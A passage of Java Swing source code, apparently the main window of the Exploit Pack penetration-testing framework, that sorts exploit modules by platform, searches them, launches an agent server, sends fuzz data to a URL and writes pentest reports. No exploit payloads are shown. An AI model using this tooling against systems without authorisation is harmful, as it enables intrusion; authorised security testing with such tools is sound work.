                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 36);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("openbsd")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 37);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 37);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("openbsd_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 38);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 38);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("osx")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 39);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 39);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("osx_ppc")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 40);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 40);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("palm_os")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 41);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 41);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("php")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 42);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 42);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("plan9")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 43);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 43);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("qnx")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 44);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 44);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("sco")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 45);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 45);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("sco_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 46);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 46);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("sh4")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 47);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 47);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("solaris")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 48);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 48);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("solaris_sparc")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 49);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 49);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("solaris_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 50);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 50);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("tru64")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 51);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 51);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("ultrix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 52);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 52);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("unix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 53);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 53);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("unixware")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 54);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 54);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("webapps")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 55);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 55);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("win32")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 56);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 56);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("win64")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 57);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 57);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("windows")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 58);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 58);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("xml")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 59);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 59);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }

                    // Create Custom Exploits
                    if (NewXMLNode.Platform.equals("custom")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 0);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    }
                    // Obtain total modules
                    TotalModulesLength = i;
                }
            }
        }

        model.reload();
        modelNotepad.reload();
        modelTools.reload();
        jTreeExploits.expandRow(0);
        jTreeNotepad.expandRow(0);
        jTreeTools.expandRow(0);

        DefaultTreeModel modelModuleStatus = (DefaultTreeModel) jTreeModuleStatus.getModel();
        DefaultMutableTreeNode rootStatus = (DefaultMutableTreeNode) modelModuleStatus.getChild(modelModuleStatus.getRoot(), 0);
        rootStatus.add(new DefaultMutableTreeNode("Total in your Pack: " + TotalModulesLength));
        jTreeModuleStatus.expandRow(0);
        modelModuleStatus.reload(rootStatus);
        jTextAreaQuickInfo.append("[" + LogTime + "] " + "Total Modules: "
                + TotalModulesLength + ""
                + "\n");
        EPLogger.log("Modules loaded successfully: OK");
        EPLogger.log("Total of modules for this instance: " + TotalModulesLength);

    }//GEN-LAST:event_jMenuItem12ActionPerformed

    private void jMenuItem11ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem11ActionPerformed
        try {
            String cmd = pythonpath + " data/agent/agentserver.py " + multiServerport;
            Runtime.getRuntime().exec(cmd);        // TODO add your handling code here:

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }

    }//GEN-LAST:event_jMenuItem11ActionPerformed

    private void jButtonSearchActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonSearchActionPerformed
        // TODO add your handling code here:
        String path = "exploits/";
        String files;
        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        jTextAreaQuickInfo.append("[" + LogTime + "] "
                + "Search executed successfully: OK" + "\n");
        DefaultTreeCellRenderer rendererModules = new DefaultTreeCellRenderer();
        rendererModules.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
        rendererModules.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
        rendererModules.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/log.png"))));
        jTreeModuleStatus.setCellRenderer(rendererModules);
        DefaultTreeCellRenderer rendererExploits = new DefaultTreeCellRenderer();
        rendererExploits.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
        rendererExploits.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
        rendererExploits.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/scriptnormal.png"))));
        jTreeExploits.setCellRenderer(rendererExploits);
        DefaultTreeCellRenderer rendererRAT = new DefaultTreeCellRenderer();
        rendererRAT.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
        rendererRAT.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
        rendererRAT.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/terminal.png"))));
        jTreeRAT.setCellRenderer(rendererRAT);
        DefaultTreeCellRenderer rendererScanner = new DefaultTreeCellRenderer();
        rendererScanner.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
        rendererScanner.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
        rendererScanner.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/port.png"))));
        jTreeRemoteScanner.setCellRenderer(rendererScanner);
        DefaultTreeCellRenderer rendererTools = new DefaultTreeCellRenderer();
        rendererTools.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
        rendererTools.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
        rendererTools.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/tool.png"))));
        jTreeTools.setCellRenderer(rendererTools);
        DefaultTreeModel model = (DefaultTreeModel) jTreeExploits.getModel();
        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 0);
        root.removeAllChildren();
        boolean notfound = true;
        int searchtotal = 0;
        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                files = listOfFiles[i].getName();
                if (files.toLowerCase().contains(jTextFieldSearch.getText().toLowerCase())) {
                    // Instance of XMLTreenode
                    NewXMLNode = new XMLTreenode();
                    // Start of the class main of XMLTreenode
                    NewXMLNode.main(null, files);
                    DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                    root.add(item);
                    searchtotal++;

                    model.reload(root);
                    // Obtain total modules
                    TotalModulesLength = i;
                    notfound = false;
                }
            }
        }
        if (notfound) {
            jMenuItem12.doClick();
            jTextAreaQuickInfo.append("Sorry, module not found.." + "\n");
        }
        jTreeExploits.expandRow(0);
        DefaultTreeModel modelModuleStatus = (DefaultTreeModel) jTreeModuleStatus.getModel();
        DefaultMutableTreeNode rootStatus = (DefaultMutableTreeNode) modelModuleStatus.getChild(modelModuleStatus.getRoot(), 0);
        rootStatus.add(new DefaultMutableTreeNode("Exploits found: " + searchtotal));
        jTreeModuleStatus.expandRow(0);
        modelModuleStatus.reload(rootStatus);
        jTextAreaQuickInfo.append("[" + LogTime + "] " + "Total in your Pack: "
                + TotalModulesLength + ""
                + "\n");
        EPLogger.log("Search executed successfully: OK");
        EPLogger.log("Total of modules for this instance: " + TotalModulesLength);
    }//GEN-LAST:event_jButtonSearchActionPerformed

    private void jTextFieldSearchActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldSearchActionPerformed
        // TODO add your handling code here:
        jTextFieldSearch.setText("");
    }//GEN-LAST:event_jTextFieldSearchActionPerformed

    private void jTextFieldSearchKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextFieldSearchKeyPressed
        // TODO add your handling code here:
        if (evt.getKeyChar() == KeyEvent.VK_ENTER) {
            jButtonSearch.doClick();
        }
    }//GEN-LAST:event_jTextFieldSearchKeyPressed

    private void jTextFieldSearchMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldSearchMouseClicked
        // TODO add your handling code here:
        jTextFieldSearch.setText("");
    }//GEN-LAST:event_jTextFieldSearchMouseClicked

    private void jButton5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton5ActionPerformed
        // TODO add your handling code here:
        String url = "https://juansacco.gitbooks.io/exploitpack/content/";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton5ActionPerformed

    private void jMenuItem8ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem8ActionPerformed
        // TODO add your handling code here:
        String url = "http://www.exploitpack.com";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem8ActionPerformed

    private void jMenuItem50ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem50ActionPerformed
        // TODO add your handling code here:
        // TODO add your handling code here:
        String url = "http://www.exploitpack.com";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem50ActionPerformed

    private void jMenuItem51ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem51ActionPerformed
        // TODO add your handling code here:
        String url = "https://www.corelan.be";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem51ActionPerformed

    private void jMenuItem52ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem52ActionPerformed
        // TODO add your handling code here:
        String url = "http://www.exploit-db.com";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem52ActionPerformed

    private void jMenuItem53ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem53ActionPerformed
        // TODO add your handling code here:
        String url = "http://www.securityfocus.com";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem53ActionPerformed

    private void jMenuItem54ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem54ActionPerformed
        // TODO add your handling code here:
        String url = "http://seclists.org/fulldisclosure/";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem54ActionPerformed

    private void jMenuItem55ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem55ActionPerformed
        // TODO add your handling code here:
        String url = "http://exploitpack.com/packs.html";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem55ActionPerformed

    private void jMenuItem56ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem56ActionPerformed
        // TODO add your handling code here:
        String url = "https://www.facebook.com/ExploitPack";
        try {
            Desktop.getDesktop().browse(java.net.URI.create(url));

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem56ActionPerformed

    private void jComboBox1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jComboBox1ActionPerformed
        // TODO add your handling code here:
        if (jComboBox1.getSelectedItem().toString().equals("Show all modules")) {
            jTextFieldSearch.setText("");
            jButtonSearch.doClick();
            jTextFieldSearch.setText("Name, author, platform, etc.");
        }

        if (jComboBox1.getSelectedItem().toString().equals("Show recent")) {
//TODO
        }
        if (jComboBox1.getSelectedItem().toString().equals("Count modules")) {
            jMenuItem12.doClick();
        }
    }//GEN-LAST:event_jComboBox1ActionPerformed

    private void jMenuItem57ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem57ActionPerformed
        // TODO add your handling code here:
        GettingStarted.main(null);
    }//GEN-LAST:event_jMenuItem57ActionPerformed

    private void jMenuItem64ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem64ActionPerformed
        // TODO add your handling code here:
        this.dispose();
    }//GEN-LAST:event_jMenuItem64ActionPerformed

    private void jMenuItem63ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem63ActionPerformed
        // TODO add your handling code here:
        jMenuItem12.doClick();
    }//GEN-LAST:event_jMenuItem63ActionPerformed

    private void jTreeNotepadValueChanged(javax.swing.event.TreeSelectionEvent evt) {//GEN-FIRST:event_jTreeNotepadValueChanged
        // TODO add your handling code here:
        String ServerSelection = evt.getPath().getPath()[2].toString();
        ServerSelection = ServerSelection.concat(".xml");
        jTabbedPane.setSelectedIndex(1);
        // Start de la clase main de XMLTreenode
        NewXMLNode.main(null, ServerSelection);
        jTextAreaQuickInfo.setText("Server Name: "
                + NewXMLNode.ExploitName + "\n");
        jTextAreaQuickInfo.append("Author of this module: "
                + NewXMLNode.Author + "\n");
        jTextAreaQuickInfo.append("Type of exploit: "
                + NewXMLNode.ExploitType + "\n");
        jTextAreaQuickInfo.append("CVE ( Mitre ID ): "
                + NewXMLNode.Vulnerability + "\n");
        jTextAreaQuickInfo.append("Disclosure Date: "
                + NewXMLNode.Date);
        jTextAreaQuickInfo.append(NewXMLNode.Information);
        jTextAreaQuickInfo.setCaretPosition(0);

        // Set new instance of exploit
        exploit.setModuleName(NewXMLNode.ExploitName);
        exploit.setCodeName(NewXMLNode.CodeName);
        exploit.setType(NewXMLNode.ExploitType);
        exploit.setPlatform(NewXMLNode.Platform);
        exploit.setService(NewXMLNode.Service);
        exploit.setShellcodePort(NewXMLNode.ShellPort);
        exploit.setRemotePort(NewXMLNode.RemotePort);
        exploit.setShellcodeAvail(NewXMLNode.ShellcodeAvailable);
        exploit.setInformation(NewXMLNode.Information);
        exploit.setSpecialArgs(NewXMLNode.SpecialArgs);
        exploit.setAuthor(NewXMLNode.Author);
        exploit.setVulnerability(NewXMLNode.Vulnerability);
        exploit.setTargets(NewXMLNode.Targets);

        try {
            StringBuilder sb;
            try (BufferedReader fileInput = new BufferedReader(new FileReader("exploits/code/" + NewXMLNode.CodeName))) {
                String text = null;
                sb = new StringBuilder();
                do {
                    if (text != null) {
                        sb.append(text).append("\n");
                    }
                } while ((text = fileInput.readLine()) != null);

            }
            jTextAreaTargets.setText(sb.toString());
            jTextAreaTargets.setCaretPosition(0);
            jLabelTargetName.setText(exploit.getModuleName());

            if (NewXMLNode.Platform.equals("windows")) {
                if (NewXMLNode.SpecialArgs.equals("owned")) {

                } else {
                    jLabelPlatform.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/windowslogo.png"))));
                }
            }
            if (NewXMLNode.Platform.equals("linux")) {
                if (NewXMLNode.SpecialArgs.equals("owned")) {

                } else {
                    jLabelPlatform.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/linuxlogo.png"))));
                }
            }
            if (NewXMLNode.Platform.equals("osx")) {
                if (NewXMLNode.SpecialArgs.equals("owned")) {

                } else {
                    jLabelPlatform.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/maclogo.png"))));
                }
            }
            if (NewXMLNode.Platform.equals("bsd")) {
                if (NewXMLNode.SpecialArgs.equals("owned")) {

                } else {
                    jLabelPlatform.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/bsdlogo.png"))));
                }
            }
            if (NewXMLNode.Platform.equals("mobile")) {
                if (NewXMLNode.SpecialArgs.equals("owned")) {

                } else {
                    jLabelPlatform.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/mobile_phone.png"))));

                }
            }

        } catch (IOException e1) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e1);
        }
    }//GEN-LAST:event_jTreeNotepadValueChanged

    private void jButton25ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton25ActionPerformed
        try {
            File htmlFile = new File("data/test.html");
            Desktop.getDesktop().browse(htmlFile.toURI());

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton25ActionPerformed

    private void jCheckBoxSocketRandomActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jCheckBoxSocketRandomActionPerformed
        // TODO add your handling code here:

        jTextFieldSocketData.setText(String.valueOf(Long.toHexString(Double.doubleToLongBits(Math.random()))));
    }//GEN-LAST:event_jCheckBoxSocketRandomActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        // TODO add your handling code here:
        try {
            jTextAreaSocketFuzz.setText("");
            String data = "";
            if (!"1234567890asdfghjkl".equals(jTextFieldSocketData.getText())) {
                data = jTextFieldSocketData.getText();
            }
            if (jTextFieldSocketData.getText().equals("")) {
                jTextFieldSocketData.setText("No data");
            }
            jTextAreaSocketFuzz.append("Data sent to: " + jTextFieldSocketURL.getText() + "\n");
            jTextAreaSocketFuzz.append("Using data: " + jTextFieldSocketData.getText() + "\n");

            // Create a URL to check app version
            URL url = new URL(jTextFieldSocketURL.getText() + ":" + jTextFieldSocketPort.getText() + "/" + data);
            // Read all the text returned by the server
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(url.openStream()));
            String socketLine;
            while ((socketLine = in.readLine()) != null) {
                jTextAreaSocketFuzz.append(socketLine + "\n");
            }
            in.close();
            jTextAreaSocketFuzz.setCaretPosition(0);
        } catch (IOException ex) {
            jTextAreaSocketFuzz.append("No response received, sorry.\n");
            Logger
                    .getLogger(InitialCheck.class
                            .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton1ActionPerformed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        try {
            String imglogo = "";
            if (jTextFieldPentestImage.getText().contains("/image/path")) {
                imglogo = "../logo.png";
            } else {
                imglogo = jTextFieldPentestImage.getText();
            }
            // Obtain local time
            Format formatter;
            Date date = new Date();
            formatter = new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z");
            LogTime = formatter.format(date);
            // TODO add your handling code here:
            File dir = new File("output/" + jTextFieldPentestName.getText());
            dir.mkdir();
            FileWriter fstream = new FileWriter("output/" + jTextFieldPentestName.getText() + "/" + jTextFieldPentestName.getText() + ".html");
            BufferedWriter out = new BufferedWriter(fstream);
            out.append("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">");
            out.append("<style type=\"text/css\">");
            out.append("				* {text-decoration: none; vertical-align: baseline;}");
            out.append("				table {border-collapse: collapse; empty-cells: show;}");
            out.append("				:link, :visited {text-decoration: underline;}");
            out.append("				.style_0 { font-family: serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: medium; text-indent: 0em; text-align: ");
            out.append("left; letter-spacing: normal; word-spacing: normal; text-transform: none; white-space: normal; color: #000000; orphans: 2; widows: 2; page-");
            out.append("break-inside: auto; line-height: normal;}");
            out.append("				.style_5 { font-weight: bold; font-size: xx-large; text-align: center;}\n"
                    + "				.style_13 { text-align: right;}\n"
                    + "				.style_15 { background-color: #eaeaea;}\n"
                    + "				.style_18 { vertical-align: top;}\n"
